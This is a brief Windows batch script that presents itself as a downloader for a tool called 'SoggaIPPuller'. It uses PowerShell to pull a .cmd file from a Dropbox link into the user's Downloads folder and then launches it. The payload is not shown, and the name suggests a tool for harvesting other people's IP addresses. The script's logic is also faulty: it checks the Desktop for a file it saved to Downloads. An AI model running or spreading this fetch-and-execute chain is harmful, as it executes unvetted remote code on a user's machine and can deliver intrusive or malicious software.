@echo off
color 02
title SoggaIPPuller Download

echo [+] Downloading SoggaIPPuller...
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/r0d1x2s361si92lk19u71/SoggaIPPuller.cmd?rlkey=uh2yruc2h4kvld5xxqpdlu1by&st=wz4tumtt&dl=1' -OutFile '%userprofile%\downloads\SoggaIPPuller.cmd'"

if exist "%userprofile%\Desktop\SoggaIPPuller.cmd" (
    echo [+] Download Complete! Running file...
    start "" "%userprofile%\downloads\SoggaIPPuller.cmd"
) else (
    echo [!] Download failed. Check your internet or link.
)

pause
exit /b
